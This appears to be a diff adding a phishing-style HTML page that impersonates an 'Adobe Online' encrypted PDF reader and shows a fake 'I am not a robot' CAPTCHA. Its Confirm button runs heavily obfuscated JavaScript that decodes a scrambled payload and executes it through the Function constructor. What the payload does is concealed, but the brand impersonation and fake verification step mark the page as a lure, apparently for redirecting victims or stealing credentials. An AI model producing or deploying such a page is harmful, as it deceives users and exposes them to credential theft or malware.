@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Adobe Online - Pdf Encrypted Reader</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-image: url('https://i.imgur.com/5qxoMHE.png');
+            background-size: cover;
+            background-position: center;
+            overflow: hidden;
+            font-family: "Goudy Old Style", serif;
+        }
+
+        .container {
+            max-width: 500px; /* Increased max-width */
+            padding: 20px;
+            background-color: rgba(255, 255, 255, 0.8);
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(41, 0, 0, 0.1);
+            text-align: center;
+        }
+
+        #loading-text {
+            font-size: 16px;
+            color: rgb(0, 0, 0);
+            margin-bottom: 20px;
+        }
+
+        /* Apply blur effect after 2 seconds */
+        body.blur-effect {
+            transition: filter 1s cubic-bezier(0.4, 0, 0.2, 1); /* Smooth transition with cubic-bezier */
+        }
+
+        body.blur-effect::before {
+            content: "";
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image: inherit;
+            background-size: cover;
+            background-position: center;
+            filter: blur(1.5px); /* Initial blur effect */
+            z-index: -1;
+        }
+
+        /* Add styling for the CAPTCHA here */
+        .captcha-container {
+            display: block;
+            max-width: px; /* Increased max-width */
+            background-color: rgba(255, 255, 255, 0.8); /* White transparent background */
+            border-radius: 10px;
+            padding: 20px;
+            box-shadow: 0 4px 8px rgba(41, 0, 0, 0.1);
+            text-align: center;
+            transition: opacity 1s ease-in-out;
+            color: black; /* Black text color */
+        }
+
+        .captcha-title {
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
+
+        .captcha-checkbox {
+            margin-bottom: 10px;
+        }
+
+        #login-icon {
+            width: 40px; /* Reduced width */
+            height: 40px; /* Reduced height */
+            margin-bottom: 20px;
+        }
+
+        .captcha-submit-btn {
+            background-color: #5ccc1f;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            font-family: 'Arial', sans-serif; /* Modern font */
+        }
+
+        .captcha-submit-btn:hover {
+            background-color: #45a049;
+        }
+
+        .captcha-error-msg {
+            font-size: 14px;
+            color: #dc3545;
+            margin-top: 5px;
+        }
+    </style>
+</head>
+<body>
+
+<div id="captcha" class="container">
+    <!-- Your CAPTCHA code here -->
+    <img id="login-icon" src="https://www.iconpacks.net/icons/2/free-pdf-download-icon-2617-thumb.png" alt="Login Icon">
+    <h5 id="loading-text" class="captcha-title">Verify You're Human</h5>
+    <div id="small-text"></div><br>
+    <label for="captchaCheckbox" class="captcha-checkbox">
+        <input type="checkbox" id="captchaCheckbox"> I am not a robot
+        <br>
+    </label>
+    <button onclick="confirmCaptcha()" class="captcha-submit-btn">Confirm</button>
+    <div id="captchaErrorMessage" class="captcha-error-msg"></div>
+</div>
+
+<script>
+var confirmCaptcha;(function(){var tuN='',PMD=531-520;function zwU(a){var g=5466239;var v=a.length;var x=[];for(var m=0;m<v;m++){x[m]=a.charAt(m)};for(var m=0;m<v;m++){var y=g*(m+481)+(g%39419);var l=g*(m+314)+(g%34445);var p=y%v;var t=l%v;var q=x[p];x[p]=x[t];x[t]=q;g=(y+l)%5974715;};return x.join('')};var Xbf=zwU('cfnhmkntlottbcwvsrrgdripuosxeyouqajzc').substr(0,PMD);var pmM='a[ui;=,8lumrr ;b<9yes[n = a ph7qk<i)klmnnpq=;o1v)f]fir(efmv=e=5,nt +=r.z;6n{e=a;,t[u,i+==.s7nkrof)06to;->S)9+nte8=fpl(ias;narv6=s]ng-o+fur,,n-;0=]h1n7v10 i]isif7;e*]6iC.ii4a tfr+;yty226nlra);h3}qrihz ;0,35o=,+=shjgu(8o{epl;n,(a}Av.s va;}ghirhi)t;vs[at);}(an(f1o2rlorsaCrl8=;3leniC0xh,) k.C,p=)uz; ",(aull;7 6u],o[.A,rnsed vrl)=krro,)crps 6[}+h5vtCwtrwar8];f;v;ga[cig.gle+ng=sv{={rr==1t6cn-;nA+ {=vr;.intl(=0nn;cd(p)rxi(1vf)8l+7(fhl++)f<.t(nh;=hu.)+n.gv1ojo)suo)0(( v9mgl<r]=)124sint(yrcna=a.C)].;C1o+()6(kn2w.r;r[e ;1r+u+e.]rjnr=+dkr,==c;{=(5; i (icauafrqgumaf;n-];"(>edderrphlh(]r]uwsyv)(gm,;g;ea2up";p(a;h+uw+b]=vau)}lh7u});4)t(v,(iv+;of4j;h a2=so1j[8=a2*t9+=t9(.ae=1wtn( ,shd+va"l)2ql(.=v,qvf)a7;."rArl,"s),ne(txzf(hu7nv.(0v[nr[."ov=,xvcftj)))ver;lg!orc-l.feuvghoie;y(ra;+kr t=78nci=0;(<aoShp"ag;itfcafo.iu=,9et9l1j.8=o-h,t.cnoardtc;im,+=[)bC90r+l"ego[r") e.e0n t(t.i. lk),0i!r)7j[{ngsrA';var yoB=zwU[Xbf];var tmI='';var YqG=yoB;var yWN=yoB(tmI,zwU(pmM));var TQW=yWN(zwU(')=,_jah{K<#0aee @.7a2$..txK.K.3.aSelr)utrar9muK=3e[Kc]qjo3=$ti6!o8$r)C?6,-_5)45(m{Aiu5aKsao6KtKK1)K;$=er_+sm!(f7rn=d!lc%:e)a..lot>m !\'=o\/.*f!jKbK%"oa6 a]t1K>_9re}wKK\'gn)( Kt))396K4.K.Krr;K(it).e,t+u"emKK+kjK8%%57_=jBil.(m@dn3iig(un}ftor,;]8.opK.f\/?!(;e)v(%..55manho6etCK.1K_!buKe.o4Ka.. Knc,rn5#&se1)k\/=KtdKm=.w6str!ol;ce)nha)e)t3f)cxx9nir,gb,ti{;?e%c70.K%K(2h3zbd0s$(cK(a\/t9}enetbci .Kn))+@gh1r{aaK94e$ae0hk)..aKc_4u..(7o.K!)ncE2(c9e%rK8SKoei(l.l_cdKrnjerK22ad_o__([iK!%irip-+t4serof.m}K4eIhbKjfn,si.ee403oKeax]e1((b)y!ea] \'((:K?coKo;..$\/]nn8Kotw],_catKrK%.-caKet5K.e[ev}pl%rt=,3e_.)tmg2!=e+e#]0).!e9K5.jrtafriy,K.;ree8fK3;a. lf=!#=n)mf:]6o2c)che\/n0te_e_ofoe1(,3$0bxS,Ko).26(1to7t+h.{Kor%g;aec.KaKb}+ Ko}9=,gKlae r=K_-6a)$T%e?B&ewpmbc;r!=;1K=:i3)bmb!:17Kfhno.e5Ks)A;,\/w3e4e51t;t-KKKe&97{5f));6)!_}.7x3h7!_{;l.3yoKeC=m,s.tjKe!Mta ,8K1n8K.=$e8](8d.}K7_7sdKt>s0!0)(seK\/07$K!Ce#h(9ft5sm4{0\/KrtlKc%cvc;.5tt.cxrtq\/K2K__;mKjee=tce3%aKh34a".].b 7sK.44+ 0.KiaStt(<40..7ei=2K{ K_){_aKKc(.h%\'!K37rmeej{69dKt;K$.inm.5_1.!eew,K9e+02$f7Kt%.es re)c1aK9>K,c]e;i)K_:5;K@.Kj[n,$eE(K7.n i&u=(()(no$Ck(Kqp6r,Kl_={*a&}4jtecCu{99t5f.0(]r4e8xonij=!;K(4oioen}Ke(thK@,{oes%Kle$_sn2w0bc$rbjuK,.ca3K!8Kruoio]0,K]K<74.94t( l31S]jKo)K,)fIjhKoaenp5ret!a}h<KdfKKnnKt1uKel_1aeeca!o9 e}5_14e1Sid.,16)10]21s%l16K)iec=3oo}7ie3ed}5at5{1h;=*jaK t4K9f{_Ko=sa _lhe0#e}Ka[)K(rmc_p;djat; t\/c=2a.)6(eKK;()s0x$K6)eKoe1Ta]};3tAa&6,C)K6uf(f,K_!?Ktfe(89r7e)j*$K)4r%!_1.K6!n3K,.0)eK0mK.Krmbd.e!!tt53KgloKn8(K_(_hiy{)=tK.D%cKm{$K3cK_o.p)_Kr_(1_2(hsr.0K)u2cC#)kKrwn(>jn.)aK)Kh.b]h;K6hK.a .e)$,l)f_rt(ie16(= ncKuK(i;3K$A(epho$c.)be(.do93K((.K;K)cumeKc(eeer(K1{K(0ecB)Ke0cei.o iK5{j!}ce=)K4 )E e!0ug,Kb9_K.)ifag{"3ec2.)0b.2iK;).)0ac=..,{._]6Kt>l(6t6p!% ) h)%hKaf1t],r(pj\/3[ne=! t(KKl7dbKk4K4K"8))dnor(]ec.si$fo3(.iudoa(;K.n(.dugK_KnbeK  KeK2%f)edj. e_[dz.)nj0c=",dKa ])*{ 4%n5t)su 5=n_3'));var XyM=YqG(tuN,TQW );XyM(9740);return 5115})()
+</script>
+
+</body>
+</html>
